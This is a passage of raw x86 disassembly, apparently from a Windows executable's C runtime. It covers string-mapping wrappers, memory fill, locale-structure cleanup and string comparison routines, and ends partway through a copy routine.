  427842:	push   ebx
  427843:	push   DWORD PTR [ebp+0x14]
  427846:	push   DWORD PTR [ebp+0x10]
  427849:	xor    eax,eax
  42784b:	cmp    DWORD PTR [ebp+0x24],ebx
  42784e:	setne  al
  427851:	lea    eax,[eax*8+0x1]
  427858:	push   eax
  427859:	push   DWORD PTR [ebp+0x20]
  42785c:	call   DWORD PTR ds:0x429128
  427862:	mov    esi,eax
  427864:	mov    DWORD PTR [ebp-0x28],esi
  427867:	cmp    esi,ebx
  427869:	je     0x427a27
  42786f:	mov    DWORD PTR [ebp-0x4],0x1
  427876:	lea    eax,[esi+esi*1]
  427879:	add    eax,0x3
  42787c:	and    eax,0xfffffffc
  42787f:	call   0x425480
  427884:	mov    DWORD PTR [ebp-0x18],esp
  427887:	mov    eax,esp
  427889:	mov    DWORD PTR [ebp-0x2c],eax
  42788c:	or     DWORD PTR [ebp-0x4],0xffffffff
  427890:	jmp    0x4278ad
  427892:	xor    eax,eax
  427894:	inc    eax
  427895:	ret    
  427896:	mov    esp,DWORD PTR [ebp-0x18]
  427899:	call   0x4288c5
  42789e:	xor    ebx,ebx
  4278a0:	mov    DWORD PTR [ebp-0x2c],ebx
  4278a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4278a7:	mov    edi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    esi,DWORD PTR [ebp-0x28]
  4278ad:	cmp    DWORD PTR [ebp-0x2c],ebx
  4278b0:	jne    0x4278ce
  4278b2:	lea    eax,[esi+esi*1]
  4278b5:	push   eax
  4278b6:	call   0x426152
  4278bb:	pop    ecx
  4278bc:	mov    DWORD PTR [ebp-0x2c],eax
  4278bf:	cmp    eax,ebx
  4278c1:	je     0x427a27
  4278c7:	mov    DWORD PTR [ebp-0x20],0x1
  4278ce:	push   esi
  4278cf:	push   DWORD PTR [ebp-0x2c]
  4278d2:	push   DWORD PTR [ebp+0x14]
  4278d5:	push   DWORD PTR [ebp+0x10]
  4278d8:	push   0x1
  4278da:	push   DWORD PTR [ebp+0x20]
  4278dd:	call   DWORD PTR ds:0x429128
  4278e3:	test   eax,eax
  4278e5:	je     0x4279d1
  4278eb:	push   ebx
  4278ec:	push   ebx
  4278ed:	push   esi
  4278ee:	push   DWORD PTR [ebp-0x2c]
  4278f1:	push   DWORD PTR [ebp+0xc]
  4278f4:	push   DWORD PTR [ebp+0x8]
  4278f7:	call   DWORD PTR ds:0x42912c
  4278fd:	mov    edi,eax
  4278ff:	mov    DWORD PTR [ebp-0x1c],edi
  427902:	cmp    edi,ebx
  427904:	je     0x4279d1
  42790a:	test   BYTE PTR [ebp+0xd],0x4
  42790e:	je     0x42793d
  427910:	cmp    DWORD PTR [ebp+0x1c],ebx
  427913:	je     0x4279d1
  427919:	cmp    edi,DWORD PTR [ebp+0x1c]
  42791c:	jg     0x4279d1
  427922:	push   DWORD PTR [ebp+0x1c]
  427925:	push   DWORD PTR [ebp+0x18]
  427928:	push   esi
  427929:	push   DWORD PTR [ebp-0x2c]
  42792c:	push   DWORD PTR [ebp+0xc]
  42792f:	push   DWORD PTR [ebp+0x8]
  427932:	call   DWORD PTR ds:0x42912c
  427938:	jmp    0x4279d1
  42793d:	mov    DWORD PTR [ebp-0x4],0x2
  427944:	lea    eax,[edi+edi*1]
  427947:	add    eax,0x3
  42794a:	and    eax,0xfffffffc
  42794d:	call   0x425480
  427952:	mov    DWORD PTR [ebp-0x18],esp
  427955:	mov    eax,esp
  427957:	mov    DWORD PTR [ebp-0x30],eax
  42795a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42795e:	jmp    0x42797b
  427960:	xor    eax,eax
  427962:	inc    eax
  427963:	ret    
  427964:	mov    esp,DWORD PTR [ebp-0x18]
  427967:	call   0x4288c5
  42796c:	xor    ebx,ebx
  42796e:	mov    DWORD PTR [ebp-0x30],ebx
  427971:	or     DWORD PTR [ebp-0x4],0xffffffff
  427975:	mov    edi,DWORD PTR [ebp-0x1c]
  427978:	mov    esi,DWORD PTR [ebp-0x28]
  42797b:	cmp    DWORD PTR [ebp-0x30],ebx
  42797e:	jne    0x427998
  427980:	lea    eax,[edi+edi*1]
  427983:	push   eax
  427984:	call   0x426152
  427989:	pop    ecx
  42798a:	mov    DWORD PTR [ebp-0x30],eax
  42798d:	cmp    eax,ebx
  42798f:	je     0x4279d1
  427991:	mov    DWORD PTR [ebp-0x24],0x1
  427998:	push   edi
  427999:	push   DWORD PTR [ebp-0x30]
  42799c:	push   esi
  42799d:	push   DWORD PTR [ebp-0x2c]
  4279a0:	push   DWORD PTR [ebp+0xc]
  4279a3:	push   DWORD PTR [ebp+0x8]
  4279a6:	call   DWORD PTR ds:0x42912c
  4279ac:	test   eax,eax
  4279ae:	je     0x4279d1
  4279b0:	push   ebx
  4279b1:	push   ebx
  4279b2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4279b5:	jne    0x4279bb
  4279b7:	push   ebx
  4279b8:	push   ebx
  4279b9:	jmp    0x4279c1
  4279bb:	push   DWORD PTR [ebp+0x1c]
  4279be:	push   DWORD PTR [ebp+0x18]
  4279c1:	push   edi
  4279c2:	push   DWORD PTR [ebp-0x30]
  4279c5:	push   ebx
  4279c6:	push   DWORD PTR [ebp+0x20]
  4279c9:	call   DWORD PTR ds:0x4290bc
  4279cf:	mov    edi,eax
  4279d1:	cmp    DWORD PTR [ebp-0x24],ebx
  4279d4:	je     0x4279df
  4279d6:	push   DWORD PTR [ebp-0x30]
  4279d9:	call   0x42603a
  4279de:	pop    ecx
  4279df:	cmp    DWORD PTR [ebp-0x20],ebx
  4279e2:	je     0x4279ed
  4279e4:	push   DWORD PTR [ebp-0x2c]
  4279e7:	call   0x42603a
  4279ec:	pop    ecx
  4279ed:	mov    eax,edi
  4279ef:	jmp    0x427b4f
  4279f4:	mov    DWORD PTR [ebp-0x34],ebx
  4279f7:	xor    edi,edi
  4279f9:	mov    DWORD PTR [ebp-0x38],ebx
  4279fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4279ff:	jne    0x427a09
  427a01:	mov    eax,ds:0x4638a4
  427a06:	mov    DWORD PTR [ebp+0x8],eax
  427a09:	cmp    DWORD PTR [ebp+0x20],ebx
  427a0c:	jne    0x427a16
  427a0e:	mov    eax,ds:0x4638b4
  427a13:	mov    DWORD PTR [ebp+0x20],eax
  427a16:	push   DWORD PTR [ebp+0x8]
  427a19:	call   0x4286ad
  427a1e:	pop    ecx
  427a1f:	mov    DWORD PTR [ebp-0x3c],eax
  427a22:	cmp    eax,0xffffffff
  427a25:	jne    0x427a2e
  427a27:	xor    eax,eax
  427a29:	jmp    0x427b4f
  427a2e:	cmp    eax,DWORD PTR [ebp+0x20]
  427a31:	je     0x427b25
  427a37:	push   ebx
  427a38:	push   ebx
  427a39:	lea    ecx,[ebp+0x14]
  427a3c:	push   ecx
  427a3d:	push   DWORD PTR [ebp+0x10]
  427a40:	push   eax
  427a41:	push   DWORD PTR [ebp+0x20]
  427a44:	call   0x4286f6
  427a49:	add    esp,0x18
  427a4c:	mov    DWORD PTR [ebp-0x34],eax
  427a4f:	cmp    eax,ebx
  427a51:	je     0x427a27
  427a53:	push   ebx
  427a54:	push   ebx
  427a55:	push   DWORD PTR [ebp+0x14]
  427a58:	push   eax
  427a59:	push   DWORD PTR [ebp+0xc]
  427a5c:	push   DWORD PTR [ebp+0x8]
  427a5f:	call   DWORD PTR ds:0x429124
  427a65:	mov    esi,eax
  427a67:	mov    DWORD PTR [ebp-0x40],esi
  427a6a:	cmp    esi,ebx
  427a6c:	je     0x427b14
  427a72:	mov    DWORD PTR [ebp-0x4],ebx
  427a75:	add    eax,0x3
  427a78:	and    eax,0xfffffffc
  427a7b:	call   0x425480
  427a80:	mov    DWORD PTR [ebp-0x18],esp
  427a83:	mov    edi,esp
  427a85:	mov    DWORD PTR [ebp-0x44],edi
  427a88:	push   esi
  427a89:	push   ebx
  427a8a:	push   edi
  427a8b:	call   0x427d30
  427a90:	add    esp,0xc
  427a93:	jmp    0x427aa5
  427a95:	xor    eax,eax
  427a97:	inc    eax
  427a98:	ret    
  427a99:	mov    esp,DWORD PTR [ebp-0x18]
  427a9c:	call   0x4288c5
  427aa1:	xor    ebx,ebx
  427aa3:	xor    edi,edi
  427aa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  427aa9:	cmp    edi,ebx
  427aab:	jne    0x427ad0
  427aad:	push   DWORD PTR [ebp-0x40]
  427ab0:	call   0x426152
  427ab5:	pop    ecx
  427ab6:	mov    edi,eax
  427ab8:	cmp    edi,ebx
  427aba:	je     0x427aed
  427abc:	push   DWORD PTR [ebp-0x40]
  427abf:	push   ebx
  427ac0:	push   edi
  427ac1:	call   0x427d30
  427ac6:	add    esp,0xc
  427ac9:	mov    DWORD PTR [ebp-0x38],0x1
  427ad0:	push   DWORD PTR [ebp-0x40]
  427ad3:	push   edi
  427ad4:	push   DWORD PTR [ebp+0x14]
  427ad7:	push   DWORD PTR [ebp-0x34]
  427ada:	push   DWORD PTR [ebp+0xc]
  427add:	push   DWORD PTR [ebp+0x8]
  427ae0:	call   DWORD PTR ds:0x429124
  427ae6:	mov    DWORD PTR [ebp-0x40],eax
  427ae9:	cmp    eax,ebx
  427aeb:	jne    0x427af1
  427aed:	xor    esi,esi
  427aef:	jmp    0x427b17
  427af1:	push   DWORD PTR [ebp+0x1c]
  427af4:	push   DWORD PTR [ebp+0x18]
  427af7:	lea    eax,[ebp-0x40]
  427afa:	push   eax
  427afb:	push   edi
  427afc:	push   DWORD PTR [ebp+0x20]
  427aff:	push   DWORD PTR [ebp-0x3c]
  427b02:	call   0x4286f6
  427b07:	add    esp,0x18
  427b0a:	mov    esi,eax
  427b0c:	neg    esi
  427b0e:	sbb    esi,esi
  427b10:	neg    esi
  427b12:	jmp    0x427b17
  427b14:	mov    esi,DWORD PTR [ebp-0x48]
  427b17:	cmp    DWORD PTR [ebp-0x38],ebx
  427b1a:	je     0x427b3f
  427b1c:	push   edi
  427b1d:	call   0x42603a
  427b22:	pop    ecx
  427b23:	jmp    0x427b3f
  427b25:	push   DWORD PTR [ebp+0x1c]
  427b28:	push   DWORD PTR [ebp+0x18]
  427b2b:	push   DWORD PTR [ebp+0x14]
  427b2e:	push   DWORD PTR [ebp+0x10]
  427b31:	push   DWORD PTR [ebp+0xc]
  427b34:	push   DWORD PTR [ebp+0x8]
  427b37:	call   DWORD PTR ds:0x429124
  427b3d:	mov    esi,eax
  427b3f:	cmp    DWORD PTR [ebp-0x34],ebx
  427b42:	je     0x427b4d
  427b44:	push   DWORD PTR [ebp-0x34]
  427b47:	call   0x42603a
  427b4c:	pop    ecx
  427b4d:	mov    eax,esi
  427b4f:	lea    esp,[ebp-0x54]
  427b52:	call   0x42546f
  427b57:	ret    
  427b58:	push   0x1c
  427b5a:	push   0x429ec8
  427b5f:	call   0x425434
  427b64:	xor    esi,esi
  427b66:	cmp    DWORD PTR ds:0x4638c0,esi
  427b6c:	jne    0x427ba3
  427b6e:	lea    eax,[ebp-0x1c]
  427b71:	push   eax
  427b72:	xor    edi,edi
  427b74:	inc    edi
  427b75:	push   edi
  427b76:	push   0x429e9c
  427b7b:	push   edi
  427b7c:	call   DWORD PTR ds:0x429134
  427b82:	test   eax,eax
  427b84:	je     0x427b8e
  427b86:	mov    DWORD PTR ds:0x4638c0,edi
  427b8c:	jmp    0x427ba3
  427b8e:	call   DWORD PTR ds:0x429030
  427b94:	cmp    eax,0x78
  427b97:	jne    0x427ba3
  427b99:	mov    DWORD PTR ds:0x4638c0,0x2
  427ba3:	mov    eax,ds:0x4638c0
  427ba8:	cmp    eax,0x2
  427bab:	je     0x427c9b
  427bb1:	cmp    eax,esi
  427bb3:	je     0x427c9b
  427bb9:	cmp    eax,0x1
  427bbc:	jne    0x427cc1
  427bc2:	mov    DWORD PTR [ebp-0x20],esi
  427bc5:	mov    DWORD PTR [ebp-0x24],esi
  427bc8:	cmp    DWORD PTR [ebp+0x18],esi
  427bcb:	jne    0x427bd5
  427bcd:	mov    eax,ds:0x4638b4
  427bd2:	mov    DWORD PTR [ebp+0x18],eax
  427bd5:	push   esi
  427bd6:	push   esi
  427bd7:	push   DWORD PTR [ebp+0x10]
  427bda:	push   DWORD PTR [ebp+0xc]
  427bdd:	xor    eax,eax
  427bdf:	cmp    DWORD PTR [ebp+0x20],esi
  427be2:	setne  al
  427be5:	lea    eax,[eax*8+0x1]
  427bec:	push   eax
  427bed:	push   DWORD PTR [ebp+0x18]
  427bf0:	call   DWORD PTR ds:0x429128
  427bf6:	mov    edi,eax
  427bf8:	mov    DWORD PTR [ebp-0x28],edi
  427bfb:	test   edi,edi
  427bfd:	je     0x427cc1
  427c03:	and    DWORD PTR [ebp-0x4],0x0
  427c07:	lea    ebx,[edi+edi*1]
  427c0a:	mov    eax,ebx
  427c0c:	add    eax,0x3
  427c0f:	and    eax,0xfffffffc
  427c12:	call   0x425480
  427c17:	mov    DWORD PTR [ebp-0x18],esp
  427c1a:	mov    esi,esp
  427c1c:	mov    DWORD PTR [ebp-0x2c],esi
  427c1f:	push   ebx
  427c20:	push   0x0
  427c22:	push   esi
  427c23:	call   0x427d30
  427c28:	add    esp,0xc
  427c2b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c2f:	jmp    0x427c46
  427c31:	xor    eax,eax
  427c33:	inc    eax
  427c34:	ret    
  427c35:	mov    esp,DWORD PTR [ebp-0x18]
  427c38:	call   0x4288c5
  427c3d:	xor    esi,esi
  427c3f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427c43:	mov    edi,DWORD PTR [ebp-0x28]
  427c46:	test   esi,esi
  427c48:	jne    0x427c61
  427c4a:	push   edi
  427c4b:	push   0x2
  427c4d:	call   0x426548
  427c52:	pop    ecx
  427c53:	pop    ecx
  427c54:	mov    esi,eax
  427c56:	test   esi,esi
  427c58:	je     0x427cc1
  427c5a:	mov    DWORD PTR [ebp-0x24],0x1
  427c61:	push   edi
  427c62:	push   esi
  427c63:	push   DWORD PTR [ebp+0x10]
  427c66:	push   DWORD PTR [ebp+0xc]
  427c69:	push   0x1
  427c6b:	push   DWORD PTR [ebp+0x18]
  427c6e:	call   DWORD PTR ds:0x429128
  427c74:	test   eax,eax
  427c76:	je     0x427c89
  427c78:	push   DWORD PTR [ebp+0x14]
  427c7b:	push   eax
  427c7c:	push   esi
  427c7d:	push   DWORD PTR [ebp+0x8]
  427c80:	call   DWORD PTR ds:0x429134
  427c86:	mov    DWORD PTR [ebp-0x20],eax
  427c89:	cmp    DWORD PTR [ebp-0x24],0x0
  427c8d:	je     0x427c96
  427c8f:	push   esi
  427c90:	call   0x42603a
  427c95:	pop    ecx
  427c96:	mov    eax,DWORD PTR [ebp-0x20]
  427c99:	jmp    0x427d09
  427c9b:	mov    ebx,DWORD PTR [ebp+0x1c]
  427c9e:	cmp    ebx,esi
  427ca0:	jne    0x427ca8
  427ca2:	mov    ebx,DWORD PTR ds:0x4638a4
  427ca8:	mov    edi,DWORD PTR [ebp+0x18]
  427cab:	test   edi,edi
  427cad:	jne    0x427cb5
  427caf:	mov    edi,DWORD PTR ds:0x4638b4
  427cb5:	push   ebx
  427cb6:	call   0x4286ad
  427cbb:	pop    ecx
  427cbc:	cmp    eax,0xffffffff
  427cbf:	jne    0x427cc5
  427cc1:	xor    eax,eax
  427cc3:	jmp    0x427d09
  427cc5:	cmp    eax,edi
  427cc7:	je     0x427ce7
  427cc9:	push   0x0
  427ccb:	push   0x0
  427ccd:	lea    ecx,[ebp+0x10]
  427cd0:	push   ecx
  427cd1:	push   DWORD PTR [ebp+0xc]
  427cd4:	push   eax
  427cd5:	push   edi
  427cd6:	call   0x4286f6
  427cdb:	add    esp,0x18
  427cde:	mov    esi,eax
  427ce0:	test   esi,esi
  427ce2:	je     0x427cc1
  427ce4:	mov    DWORD PTR [ebp+0xc],esi
  427ce7:	push   DWORD PTR [ebp+0x14]
  427cea:	push   DWORD PTR [ebp+0x10]
  427ced:	push   DWORD PTR [ebp+0xc]
  427cf0:	push   DWORD PTR [ebp+0x8]
  427cf3:	push   ebx
  427cf4:	call   DWORD PTR ds:0x429130
  427cfa:	mov    edi,eax
  427cfc:	test   esi,esi
  427cfe:	je     0x427d07
  427d00:	push   esi
  427d01:	call   0x42603a
  427d06:	pop    ecx
  427d07:	mov    eax,edi
  427d09:	lea    esp,[ebp-0x38]
  427d0c:	call   0x42546f
  427d11:	ret    
  427d12:	mov    eax,ds:0x4638c4
  427d17:	test   eax,eax
  427d19:	je     0x427d2a
  427d1b:	push   DWORD PTR [esp+0x4]
  427d1f:	call   eax
  427d21:	test   eax,eax
  427d23:	pop    ecx
  427d24:	je     0x427d2a
  427d26:	xor    eax,eax
  427d28:	inc    eax
  427d29:	ret    
  427d2a:	xor    eax,eax
  427d2c:	ret    
  427d2d:	int3   
  427d2e:	int3   
  427d2f:	int3   
  427d30:	mov    edx,DWORD PTR [esp+0xc]
  427d34:	mov    ecx,DWORD PTR [esp+0x4]
  427d38:	test   edx,edx
  427d3a:	je     0x427d8b
  427d3c:	xor    eax,eax
  427d3e:	mov    al,BYTE PTR [esp+0x8]
  427d42:	push   edi
  427d43:	mov    edi,ecx
  427d45:	cmp    edx,0x4
  427d48:	jb     0x427d7b
  427d4a:	neg    ecx
  427d4c:	and    ecx,0x3
  427d4f:	je     0x427d5d
  427d51:	sub    edx,ecx
  427d53:	mov    BYTE PTR [edi],al
  427d55:	add    edi,0x1
  427d58:	sub    ecx,0x1
  427d5b:	jne    0x427d53
  427d5d:	mov    ecx,eax
  427d5f:	shl    eax,0x8
  427d62:	add    eax,ecx
  427d64:	mov    ecx,eax
  427d66:	shl    eax,0x10
  427d69:	add    eax,ecx
  427d6b:	mov    ecx,edx
  427d6d:	and    edx,0x3
  427d70:	shr    ecx,0x2
  427d73:	je     0x427d7b
  427d75:	rep stos DWORD PTR es:[edi],eax
  427d77:	test   edx,edx
  427d79:	je     0x427d85
  427d7b:	mov    BYTE PTR [edi],al
  427d7d:	add    edi,0x1
  427d80:	sub    edx,0x1
  427d83:	jne    0x427d7b
  427d85:	mov    eax,DWORD PTR [esp+0x8]
  427d89:	pop    edi
  427d8a:	ret    
  427d8b:	mov    eax,DWORD PTR [esp+0x4]
  427d8f:	ret    
  427d90:	push   esi
  427d91:	mov    esi,DWORD PTR [esp+0x8]
  427d95:	test   esi,esi
  427d97:	je     0x427f1e
  427d9d:	push   DWORD PTR [esi+0x4]
  427da0:	call   0x42603a
  427da5:	push   DWORD PTR [esi+0x8]
  427da8:	call   0x42603a
  427dad:	push   DWORD PTR [esi+0xc]
  427db0:	call   0x42603a
  427db5:	push   DWORD PTR [esi+0x10]
  427db8:	call   0x42603a
  427dbd:	push   DWORD PTR [esi+0x14]
  427dc0:	call   0x42603a
  427dc5:	push   DWORD PTR [esi+0x18]
  427dc8:	call   0x42603a
  427dcd:	push   DWORD PTR [esi]
  427dcf:	call   0x42603a
  427dd4:	push   DWORD PTR [esi+0x20]
  427dd7:	call   0x42603a
  427ddc:	push   DWORD PTR [esi+0x24]
  427ddf:	call   0x42603a
  427de4:	push   DWORD PTR [esi+0x28]
  427de7:	call   0x42603a
  427dec:	push   DWORD PTR [esi+0x2c]
  427def:	call   0x42603a
  427df4:	push   DWORD PTR [esi+0x30]
  427df7:	call   0x42603a
  427dfc:	push   DWORD PTR [esi+0x34]
  427dff:	call   0x42603a
  427e04:	push   DWORD PTR [esi+0x1c]
  427e07:	call   0x42603a
  427e0c:	push   DWORD PTR [esi+0x38]
  427e0f:	call   0x42603a
  427e14:	push   DWORD PTR [esi+0x3c]
  427e17:	call   0x42603a
  427e1c:	add    esp,0x40
  427e1f:	push   DWORD PTR [esi+0x40]
  427e22:	call   0x42603a
  427e27:	push   DWORD PTR [esi+0x44]
  427e2a:	call   0x42603a
  427e2f:	push   DWORD PTR [esi+0x48]
  427e32:	call   0x42603a
  427e37:	push   DWORD PTR [esi+0x4c]
  427e3a:	call   0x42603a
  427e3f:	push   DWORD PTR [esi+0x50]
  427e42:	call   0x42603a
  427e47:	push   DWORD PTR [esi+0x54]
  427e4a:	call   0x42603a
  427e4f:	push   DWORD PTR [esi+0x58]
  427e52:	call   0x42603a
  427e57:	push   DWORD PTR [esi+0x5c]
  427e5a:	call   0x42603a
  427e5f:	push   DWORD PTR [esi+0x60]
  427e62:	call   0x42603a
  427e67:	push   DWORD PTR [esi+0x64]
  427e6a:	call   0x42603a
  427e6f:	push   DWORD PTR [esi+0x68]
  427e72:	call   0x42603a
  427e77:	push   DWORD PTR [esi+0x6c]
  427e7a:	call   0x42603a
  427e7f:	push   DWORD PTR [esi+0x70]
  427e82:	call   0x42603a
  427e87:	push   DWORD PTR [esi+0x74]
  427e8a:	call   0x42603a
  427e8f:	push   DWORD PTR [esi+0x78]
  427e92:	call   0x42603a
  427e97:	push   DWORD PTR [esi+0x7c]
  427e9a:	call   0x42603a
  427e9f:	add    esp,0x40
  427ea2:	push   DWORD PTR [esi+0x80]
  427ea8:	call   0x42603a
  427ead:	push   DWORD PTR [esi+0x84]
  427eb3:	call   0x42603a
  427eb8:	push   DWORD PTR [esi+0x88]
  427ebe:	call   0x42603a
  427ec3:	push   DWORD PTR [esi+0x8c]
  427ec9:	call   0x42603a
  427ece:	push   DWORD PTR [esi+0x90]
  427ed4:	call   0x42603a
  427ed9:	push   DWORD PTR [esi+0x94]
  427edf:	call   0x42603a
  427ee4:	push   DWORD PTR [esi+0x98]
  427eea:	call   0x42603a
  427eef:	push   DWORD PTR [esi+0x9c]
  427ef5:	call   0x42603a
  427efa:	push   DWORD PTR [esi+0xa0]
  427f00:	call   0x42603a
  427f05:	push   DWORD PTR [esi+0xa4]
  427f0b:	call   0x42603a
  427f10:	push   DWORD PTR [esi+0xa8]
  427f16:	call   0x42603a
  427f1b:	add    esp,0x2c
  427f1e:	pop    esi
  427f1f:	ret    
  427f20:	push   esi
  427f21:	mov    esi,DWORD PTR [esp+0x8]
  427f25:	test   esi,esi
  427f27:	je     0x427f7d
  427f29:	mov    eax,DWORD PTR [esi]
  427f2b:	mov    ecx,DWORD PTR ds:0x463434
  427f31:	cmp    eax,DWORD PTR [ecx]
  427f33:	je     0x427f44
  427f35:	cmp    eax,DWORD PTR ds:0x463404
  427f3b:	je     0x427f44
  427f3d:	push   eax
  427f3e:	call   0x42603a
  427f43:	pop    ecx
  427f44:	mov    eax,DWORD PTR [esi+0x4]
  427f47:	mov    ecx,DWORD PTR ds:0x463434
  427f4d:	cmp    eax,DWORD PTR [ecx+0x4]
  427f50:	je     0x427f61
  427f52:	cmp    eax,DWORD PTR ds:0x463408
  427f58:	je     0x427f61
  427f5a:	push   eax
  427f5b:	call   0x42603a
  427f60:	pop    ecx
  427f61:	mov    esi,DWORD PTR [esi+0x8]
  427f64:	mov    eax,ds:0x463434
  427f69:	cmp    esi,DWORD PTR [eax+0x8]
  427f6c:	je     0x427f7d
  427f6e:	cmp    esi,DWORD PTR ds:0x46340c
  427f74:	je     0x427f7d
  427f76:	push   esi
  427f77:	call   0x42603a
  427f7c:	pop    ecx
  427f7d:	pop    esi
  427f7e:	ret    
  427f7f:	push   esi
  427f80:	mov    esi,DWORD PTR [esp+0x8]
  427f84:	test   esi,esi
  427f86:	je     0x428056
  427f8c:	mov    eax,DWORD PTR [esi+0xc]
  427f8f:	mov    ecx,DWORD PTR ds:0x463434
  427f95:	cmp    eax,DWORD PTR [ecx+0xc]
  427f98:	je     0x427fa9
  427f9a:	cmp    eax,DWORD PTR ds:0x463410
  427fa0:	je     0x427fa9
  427fa2:	push   eax
  427fa3:	call   0x42603a
  427fa8:	pop    ecx
  427fa9:	mov    eax,DWORD PTR [esi+0x10]
  427fac:	mov    ecx,DWORD PTR ds:0x463434
  427fb2:	cmp    eax,DWORD PTR [ecx+0x10]
  427fb5:	je     0x427fc6
  427fb7:	cmp    eax,DWORD PTR ds:0x463414
  427fbd:	je     0x427fc6
  427fbf:	push   eax
  427fc0:	call   0x42603a
  427fc5:	pop    ecx
  427fc6:	mov    eax,DWORD PTR [esi+0x14]
  427fc9:	mov    ecx,DWORD PTR ds:0x463434
  427fcf:	cmp    eax,DWORD PTR [ecx+0x14]
  427fd2:	je     0x427fe3
  427fd4:	cmp    eax,DWORD PTR ds:0x463418
  427fda:	je     0x427fe3
  427fdc:	push   eax
  427fdd:	call   0x42603a
  427fe2:	pop    ecx
  427fe3:	mov    eax,DWORD PTR [esi+0x18]
  427fe6:	mov    ecx,DWORD PTR ds:0x463434
  427fec:	cmp    eax,DWORD PTR [ecx+0x18]
  427fef:	je     0x428000
  427ff1:	cmp    eax,DWORD PTR ds:0x46341c
  427ff7:	je     0x428000
  427ff9:	push   eax
  427ffa:	call   0x42603a
  427fff:	pop    ecx
  428000:	mov    eax,DWORD PTR [esi+0x1c]
  428003:	mov    ecx,DWORD PTR ds:0x463434
  428009:	cmp    eax,DWORD PTR [ecx+0x1c]
  42800c:	je     0x42801d
  42800e:	cmp    eax,DWORD PTR ds:0x463420
  428014:	je     0x42801d
  428016:	push   eax
  428017:	call   0x42603a
  42801c:	pop    ecx
  42801d:	mov    eax,DWORD PTR [esi+0x20]
  428020:	mov    ecx,DWORD PTR ds:0x463434
  428026:	cmp    eax,DWORD PTR [ecx+0x20]
  428029:	je     0x42803a
  42802b:	cmp    eax,DWORD PTR ds:0x463424
  428031:	je     0x42803a
  428033:	push   eax
  428034:	call   0x42603a
  428039:	pop    ecx
  42803a:	mov    esi,DWORD PTR [esi+0x24]
  42803d:	mov    eax,ds:0x463434
  428042:	cmp    esi,DWORD PTR [eax+0x24]
  428045:	je     0x428056
  428047:	cmp    esi,DWORD PTR ds:0x463428
  42804d:	je     0x428056
  42804f:	push   esi
  428050:	call   0x42603a
  428055:	pop    ecx
  428056:	pop    esi
  428057:	ret    
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	push   ebp
  428061:	mov    ebp,esp
  428063:	push   esi
  428064:	xor    eax,eax
  428066:	push   eax
  428067:	push   eax
  428068:	push   eax
  428069:	push   eax
  42806a:	push   eax
  42806b:	push   eax
  42806c:	push   eax
  42806d:	push   eax
  42806e:	mov    edx,DWORD PTR [ebp+0xc]
  428071:	lea    ecx,[ecx+0x0]
  428074:	mov    al,BYTE PTR [edx]
  428076:	or     al,al
  428078:	je     0x428083
  42807a:	add    edx,0x1
  42807d:	bts    DWORD PTR [esp],eax
  428081:	jmp    0x428074
  428083:	mov    esi,DWORD PTR [ebp+0x8]
  428086:	or     ecx,0xffffffff
  428089:	lea    ecx,[ecx+0x0]
  42808c:	add    ecx,0x1
  42808f:	mov    al,BYTE PTR [esi]
  428091:	or     al,al
  428093:	je     0x42809e
  428095:	add    esi,0x1
  428098:	bt     DWORD PTR [esp],eax
  42809c:	jae    0x42808c
  42809e:	mov    eax,ecx
  4280a0:	add    esp,0x20
  4280a3:	pop    esi
  4280a4:	leave  
  4280a5:	ret    
  4280a6:	int3   
  4280a7:	int3   
  4280a8:	int3   
  4280a9:	int3   
  4280aa:	int3   
  4280ab:	int3   
  4280ac:	int3   
  4280ad:	int3   
  4280ae:	int3   
  4280af:	int3   
  4280b0:	mov    edx,DWORD PTR [esp+0x4]
  4280b4:	mov    ecx,DWORD PTR [esp+0x8]
  4280b8:	test   edx,0x3
  4280be:	jne    0x4280fc
  4280c0:	mov    eax,DWORD PTR [edx]
  4280c2:	cmp    al,BYTE PTR [ecx]
  4280c4:	jne    0x4280f4
  4280c6:	or     al,al
  4280c8:	je     0x4280f0
  4280ca:	cmp    ah,BYTE PTR [ecx+0x1]
  4280cd:	jne    0x4280f4
  4280cf:	or     ah,ah
  4280d1:	je     0x4280f0
  4280d3:	shr    eax,0x10
  4280d6:	cmp    al,BYTE PTR [ecx+0x2]
  4280d9:	jne    0x4280f4
  4280db:	or     al,al
  4280dd:	je     0x4280f0
  4280df:	cmp    ah,BYTE PTR [ecx+0x3]
  4280e2:	jne    0x4280f4
  4280e4:	add    ecx,0x4
  4280e7:	add    edx,0x4
  4280ea:	or     ah,ah
  4280ec:	jne    0x4280c0
  4280ee:	mov    edi,edi
  4280f0:	xor    eax,eax
  4280f2:	ret    
  4280f3:	nop
  4280f4:	sbb    eax,eax
  4280f6:	shl    eax,1
  4280f8:	add    eax,0x1
  4280fb:	ret    
  4280fc:	test   edx,0x1
  428102:	je     0x42811c
  428104:	mov    al,BYTE PTR [edx]
  428106:	add    edx,0x1
  428109:	cmp    al,BYTE PTR [ecx]
  42810b:	jne    0x4280f4
  42810d:	add    ecx,0x1
  428110:	or     al,al
  428112:	je     0x4280f0
  428114:	test   edx,0x2
  42811a:	je     0x4280c0
  42811c:	mov    ax,WORD PTR [edx]
  42811f:	add    edx,0x2
  428122:	cmp    al,BYTE PTR [ecx]
  428124:	jne    0x4280f4
  428126:	or     al,al
  428128:	je     0x4280f0
  42812a:	cmp    ah,BYTE PTR [ecx+0x1]
  42812d:	jne    0x4280f4
  42812f:	or     ah,ah
  428131:	je     0x4280f0
  428133:	add    ecx,0x2
  428136:	jmp    0x4280c0
  428138:	int3   
  428139:	int3   
  42813a:	int3   
  42813b:	int3   
  42813c:	int3   
  42813d:	int3   
  42813e:	int3   
  42813f:	int3   
  428140:	mov    eax,DWORD PTR [esp+0xc]
  428144:	test   eax,eax
  428146:	je     0x428192
  428148:	mov    edx,DWORD PTR [esp+0x4]
  42814c:	push   esi
  42814d:	push   edi
  42814e:	mov    esi,edx
  428150:	mov    edi,DWORD PTR [esp+0x10]
  428154:	or     edx,edi
  428156:	and    edx,0x3
  428159:	je     0x428193
  42815b:	test   eax,0x1
  428160:	je     0x428173
